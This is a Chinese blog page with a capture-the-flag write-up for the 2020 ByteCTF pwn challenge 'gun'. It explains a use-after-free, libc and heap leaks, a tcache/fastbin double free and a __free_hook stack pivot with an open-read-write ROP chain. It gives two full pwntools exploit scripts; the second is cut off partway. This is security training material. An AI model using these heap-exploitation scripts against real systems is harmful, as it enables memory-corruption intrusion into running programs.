@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta name="renderer" content="webkit"/>
+    <meta name="force-rendering" content="webkit"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <script>if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode)) window.location.href="https://support.dmeng.net/upgrade-your-browser.html?referrer="+encodeURIComponent(window.location.href); </script>
+    
+    
+        <link rel="shortcut icon" href="/img/favicon.ico">
+    
+     
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.13.1/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/vuetify@2.2.30/dist/vuetify.min.css" rel="stylesheet">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    
+    
+
+
+
+
+
+
+
+    
+    
+          
+
+    
+    
+    
+    
+    <title>
+        
+            2020 ByteCTF | Clindy&#39;s Blog
+        
+    </title>
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+<body>
+    <div id="app">
+        <v-app>
+            <v-content id="page">
+                <v-container fluid>
+                    <v-row>
+                        <v-col cols="2" class="d-none d-md-block">
+                            <div id="sidebar" class="float-right">
+    <a href="/" rel="home">
+        <v-avatar size=96>
+            <img id="logo" src="/img/head.jpg">     
+        </v-avatar> 
+    </a>
+    <v-divider></v-divider>
+    <div class="mini-menu">
+        <v-btn icon href="/">
+            <v-icon>home</v-icon>
+        </v-btn>
+        <v-btn icon href="/categories/">
+            <v-icon>folder</v-icon>
+        </v-btn>
+        <v-btn icon href="/tags/">
+            <v-icon>bookmark</v-icon>
+        </v-btn>
+        <v-btn icon @click="SetNightMode">
+            <v-icon>{{ nightMode }}</v-icon>
+        </v-btn>
+    </div>
+    <v-list id="main-menu" class="font-weight-bold" flat>
+        
+            
+            <v-list-item href="/classic/" link>
+            <v-list-item-icon><v-icon>account_circle</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                经典例题
+            </v-list-item-content>
+            </v-list-item>
+        
+            
+            <v-list-item href="/archives/" link>
+            <v-list-item-icon><v-icon>archive</v-icon></v-list-item-icon>
+            <v-list-item-content>
+                时间线
+            </v-list-item-content>
+            </v-list-item>
+        
+    </v-list>
+    <v-divider></v-divider>
+    
+        <div class="post-toc">
+            <a href="/2020/10/25/Game/bytectf/" class="toc-header">Table of Contents</a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#gun"><span class="toc-number">1.</span> <span class="toc-text">gun</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.</span> <span class="toc-text">利用脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">1.4.</span> <span class="toc-text">方法2</span></a></li></ol></li></ol>
+            </div>
+        </div>
+    
+
+    <div id="footer">
+        <div class="footer-social">
+            
+                
+                <v-btn icon href="mailto:clindy.h@qq.com" target="_blank">
+                    <v-icon>fas fa-envelope</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://github.com/" target="_blank">
+                    <v-icon>fab fa-github</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://baidu.com" target="_blank">
+                    <v-icon>fab fa-weibo</v-icon>
+                </v-btn>
+            
+                
+                <v-btn icon href="https://baidu.com" target="_blank">
+                    <v-icon>fab fa-qq</v-icon>
+                </v-btn>
+            
+        </div>
+        <v-divider></v-divider>
+        <div class="footer-content">
+            
+                <span id="busuanzi_container_site_uv" style="display: none;"> 
+                    Total Visitors <span id="busuanzi_value_site_uv"></span>
+                </span>
+                <br>
+            
+            <span>Theme: <a target="_blank" rel="noopener" href="https://github.com/kb1000fx/hexo-theme-insulin">Insulin</a></span><br>
+            <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a></span><br>
+            <span>
+                &copy; 2020 - 2021 
+                Clindy
+            </span>
+        </div>
+    </div>
+</div>
+
+                        </v-col>
+                        <v-col cols="12" md="10">
+                            <v-row>
+  <v-col cols="12" md="8" align-self="end">
+    <div id="site-header">
+      <div id="site-title">
+        <a href="/" rel="home">Clindy&#39;s Blog</a>
+      </div>
+      <div id="site-description">像风走了八千里，不问归期</div>
+      <div id="mobile-menu" class="d-block d-md-none">
+        <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-inner-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+        <div class="mobile-mini-menu">
+          <v-btn icon href="/">
+              <v-icon>home</v-icon>
+          </v-btn>
+          <v-btn icon href="/categories/">
+              <v-icon>folder</v-icon>
+          </v-btn>
+          <v-btn icon href="/tags/">
+              <v-icon>bookmark</v-icon>
+          </v-btn>
+          <v-btn icon @click="SetNightMode">
+              <v-icon>{{ nightMode }}</v-icon>
+          </v-btn>
+          
+            
+            <v-btn icon href="/classic/">
+              <v-icon>account_circle</v-icon>
+            </v-btn>
+          
+            
+            <v-btn icon href="/archives/">
+              <v-icon>archive</v-icon>
+            </v-btn>
+          
+        </div>
+      </div>    
+    </div>
+  </v-col>  
+  <v-col cols="4" align-self="end" class="d-none d-md-block">
+    <v-col align-self="end">
+      <v-text-field label="请输入关键字" data-src="search.xml" v-model="searchHeaderValue" prepend-icon="search" clearable clear-icon="clear" @keydown.enter="EnterSearch(searchHeaderValue,false)"></v-text-field>
+    </v-col> 
+  </v-col>
+</v-row>
+
+                            <v-card class="elevation-2 post-card">
+    
+    
+        <div class="post-header">
+  <a class="post-header-title font-weight-medium" href="/2020/10/25/Game/bytectf/">2020 ByteCTF</a>
+  <div class="post-header-meta">   
+    <span>
+      <v-icon color="">event</v-icon>
+      Posted on:&nbsp;2020-10-25
+    </span>
+    <span>
+      <v-icon color="">event_available</v-icon>
+      Edited on:&nbsp;2021-01-14
+    </span>
+    <span>
+      <v-icon color="">folder</v-icon>
+      In:&nbsp;<a class="category-link" href="/categories/Game/">Game</a>
+    </span>
+    
+    <span>
+      <v-icon color="">visibility</v-icon>
+      Views:&nbsp;<span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span></span>
+    </span>
+    
+  </div>
+</div>
+
+    
+    
+    
+    
+    <div class="post-content typo">
+        <p>太难了，就写一道pwn吧。。</p>
+<h1 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h1><p>保护机制全开，符号表损失，逆向难度增大，需要动态调试找回。</p>
+<p>有沙箱，只能orw。</p>
+<p>libc版本：2.31-0ubuntu9.1_amd64</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序一开始会先让我们输name，共0x18字节，存在bss段中，之后会进入菜单。</p>
+<p>堆块的索引在全局变量上，由一个结构体数组保存着。结构体（之后统称子弹）的成员分别是：指向堆块的指针，指向结构体的指针，flag标志位。</p>
+<p><strong>1.shoot</strong></p>
+<p>输入射出子弹的个数，把load中的子弹射出去（把子弹对应的堆块free掉），期间打印该子弹对应堆块的字符串。射出一颗子弹，会把下一课子弹装入全局变量4050继续设再射，射出后flag位恢复为0。<strong>存在uaf</strong>。</p>
+<p><strong>2.load</strong></p>
+<p>最后load的子弹存在一个全局变量4050中。load时会检查是否装有子弹，如果有，把新装的子弹的next指针指向之前的子弹。子弹load后flag位置2。</p>
+<p><strong>3.buy</strong></p>
+<p>最多申请14个堆块，默认申请第一个flag位为0的索引，申请后flag位置1。</p>
+<p>单个堆块大小不能超过0x500，申请的堆块大小总和为0x1000。</p>
+<p>申请时可以往堆里写入数据。</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
+<li><p><strong>利用存在的uaf漏洞泄露libc地址</strong>。先add8个0x90大小的堆块，按顺序Load，全部Shoot出去，7个堆块进入tcache，1个进入unsorted bin，再申请一个小堆块，再free掉，可以获得main arena的地址。</p>
+</li>
+<li><p><strong>同理可以泄露heap地址</strong>，再申请一个0x80的堆块，上面会保留tcache的地址，Load后Shoot可以泄露堆地址。</p>
+</li>
+<li><p><strong>构造fast bin double free</strong>，申请9个fast bin大小的堆块，Load并shoot后面7个进tcache。因为子弹的链表位没有清零，2号子弹原本指向1号子弹，现在被放入全局变量4050。这时只要在Load一次0号子弹，0号会指向1号，而1号原本就指向0号，指针互指。这时再Shoot3次，double free便构造成功。<strong>当我们把tcache清空，要从fastbin中去堆块时，对管理器看到tcache是空的，又会把fastbin链入tcache中。</strong></p>
+</li>
+<li><p><strong>往堆块中写入shellcode</strong>，因为开启了沙箱，只能进行orw，只能自己在堆上构造ROP，劫持rip寄存器到堆上执行我们的shellcode。通过下面这条gadget做劫持：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000000005e650 : mov rsp, rdx ; ret</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>修改free_hook为下面这串gadget的起始地址</strong>。调用free_hook时，rdi寄存器的值为free的堆的首地址，下面这段gadget可以通过rdi控制rax，再通过rax控制rdx，实现栈迁移。</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000008A754                 mov     rax, [rdi+0A0h] #设为rdi，方便计算</span><br><span class="line">.text:000000000008A75B                 push    rbx</span><br><span class="line">.text:000000000008A75C                 mov     rbx, rdi</span><br><span class="line">.text:000000000008A75F                 mov     rdx, [rax+20h]  #设为rop起始地址</span><br><span class="line">.text:000000000008A763                 cmp     rdx, [rax+18h]  </span><br><span class="line">.text:000000000008A767                 jbe     short loc_8A788</span><br><span class="line">.text:000000000008A769                 mov     rax, [rax+0E0h] #调整下rax的值为rop前0x20</span><br><span class="line">.text:000000000008A770                 mov     esi, 0FFFFFFFFh </span><br><span class="line">.text:000000000008A775                 call    qword ptr [rax+18h] #调用栈迁移gadget，ROP</span><br><span class="line">#这段gadget用处挺大的，找到它需要经验。</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li><strong>写入orw的ROP</strong>，用了pwntools里的ROP模块，挺香的，原本复杂的rop链只有短短4行</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rop &#x3D; ROP(libc)</span><br><span class="line">rop.open(flag,0,0)</span><br><span class="line">rop.read(3,flag+8,0x20)</span><br><span class="line">rop.write(1,flag+8,0x20)</span><br></pre></td></tr></table></figure>
+<p>dump出来看看，看得出系统生成的ROP链的质量并不输于自己一个一个找的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0x0000:   0x155555490866 pop rdx; pop rbx; ret</span><br><span class="line">0x0008:              0x0 [arg2] rdx &#x3D; 0</span><br><span class="line">0x0010:       &#39;eaaafaaa&#39; &lt;pad rbx&gt;</span><br><span class="line">0x0018:   0x155555355529 pop rsi; ret</span><br><span class="line">0x0020:              0x0 [arg1] rsi &#x3D; 0</span><br><span class="line">0x0028:   0x155555354b72 pop rdi; ret</span><br><span class="line">0x0030:   0x55555555d870 [arg0] rdi &#x3D; 93824992270448</span><br><span class="line">0x0038:   0x15555543ee50 open</span><br><span class="line">0x0040:   0x155555490866 pop rdx; pop rbx; ret</span><br><span class="line">0x0048:             0x20 [arg2] rdx &#x3D; 32</span><br><span class="line">0x0050:       &#39;uaaavaaa&#39; &lt;pad rbx&gt;</span><br><span class="line">0x0058:   0x155555355529 pop rsi; ret</span><br><span class="line">0x0060:   0x55555555d878 [arg1] rsi &#x3D; 93824992270456</span><br><span class="line">0x0068:   0x155555354b72 pop rdi; ret</span><br><span class="line">0x0070:              0x3 [arg0] rdi &#x3D; 3</span><br><span class="line">0x0078:   0x15555543f130 read</span><br><span class="line">0x0080:   0x155555490866 pop rdx; pop rbx; ret</span><br><span class="line">0x0088:             0x20 [arg2] rdx &#x3D; 32</span><br><span class="line">0x0090:       &#39;laabmaab&#39; &lt;pad rbx&gt;</span><br><span class="line">0x0098:   0x155555355529 pop rsi; ret</span><br><span class="line">0x00a0:   0x55555555d878 [arg1] rsi &#x3D; 93824992270456</span><br><span class="line">0x00a8:   0x155555354b72 pop rdi; ret</span><br><span class="line">0x00b0:              0x1 [arg0] rdi &#x3D; 1</span><br><span class="line">0x00b8:   0x15555543f1d0 write</span><br></pre></td></tr></table></figure>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.aslr=<span class="literal">False</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lauch_gdb</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;set $s=0x555555554000+0x4060&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;bob&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Shoot</span>(<span class="params">time</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Action&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Shoot time:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(time))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Load</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Action&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Which one do you want to load?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Buy</span>(<span class="params">price,name=<span class="string">&quot;a&quot;</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Action&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Bullet price:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Bullet Name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./gun&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./gun&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#lauch_gdb()</span></span><br><span class="line">name()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    Buy(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    Load(i)       <span class="comment">#let first malloc last free</span></span><br><span class="line"></span><br><span class="line">Shoot(<span class="number">8</span>)</span><br><span class="line">Buy(<span class="number">0x20</span>)</span><br><span class="line">Load(<span class="number">0</span>)</span><br><span class="line">Shoot(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Pwn! The &quot;</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc.address = main_arena - <span class="number">2014305</span></span><br><span class="line">info(<span class="string">&quot;libc.address &lt;================== 0x%x&quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">Buy(<span class="number">0x80</span>)</span><br><span class="line">Load(<span class="number">0</span>)</span><br><span class="line">Shoot(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Pwn! The &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x361</span></span><br><span class="line">info(<span class="string">&quot;heap.address &lt;================== 0x%x&quot;</span>,heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    Buy(<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Load(<span class="number">2</span>+i)</span><br><span class="line"></span><br><span class="line">Shoot(<span class="number">7</span>)</span><br><span class="line">Load(<span class="number">0</span>)</span><br><span class="line">Shoot(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Buy(<span class="number">0x20</span>)</span><br><span class="line">Buy(<span class="number">0x20</span>,p64(libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))  <span class="comment">#7</span></span><br><span class="line">Buy(<span class="number">0x20</span>)   <span class="comment">#8</span></span><br><span class="line">Buy(<span class="number">0x20</span>)   <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">flag = heap_base+<span class="number">2144</span>+<span class="number">0x10</span></span><br><span class="line">useful_gadget = libc.address + <span class="number">0x000000000008A754</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;flag\x00\x00\x00\x00&quot;</span> + <span class="string">&quot;\x00&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(flag+<span class="number">0x108</span>) address the start of rop,mov stack to heap</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(flag)<span class="comment">#offset 0xa0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xe0</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(flag+<span class="number">0xe8</span>)  <span class="comment">#offset 0xe0</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(mov_rsp_rdx)</span><br><span class="line"></span><br><span class="line">rop = ROP(libc)</span><br><span class="line">rop.<span class="built_in">open</span>(flag,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">rop.read(<span class="number">3</span>,flag+<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line">rop.write(<span class="number">1</span>,flag+<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span> rop.dump()</span><br><span class="line">craft = [payload , rop.chain()]</span><br><span class="line">payload = <span class="string">&quot;&quot;</span>.join(craft)</span><br><span class="line"></span><br><span class="line">Buy(<span class="number">0x300</span>,payload)  <span class="comment">#10</span></span><br><span class="line">Buy(<span class="number">0x20</span>,p64(useful_gadget))    <span class="comment">#11</span></span><br><span class="line">Load(<span class="number">10</span>)</span><br><span class="line">Shoot(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>上一步用了一段非常有用的gadget，控制rdx，后间接控制了rsp，实现了栈迁移。但倘若没有那段gadget，有没有其它处理办法呢？</p>
+<p>倘若我们可以泄露出libc基址，那便可以将tcache分配到stdout结构体上，让它打印出environ参数，这样可以泄露出栈地址。得到栈地址后，将tcache分配到栈上，修改返回地址为p64(pop_rsp)+p64(ROP)也可以实现栈迁移。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.aslr=<span class="literal">False</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lauch_gdb</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;set $s=0x555555554000+0x4060&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;bob&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Shoot</span>(<span class="params">time</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Action&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Shoot time:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(time))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Load</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Action&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Which one do you want to load?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Buy</span>(<span class="params">price,name=<span class="string">&quot;a&quot;</span></span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Action&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Bullet price:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Bullet Name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./gun&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./gun&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">lauch_gdb()</span><br><span class="line">name()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    Buy(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    Load(i)       <span class="comment">#let first malloc last free</span></span><br><span class="line"></span><br><span class="line">Shoot(<span class="number">8</span>)</span><br><span class="line">Buy(<span 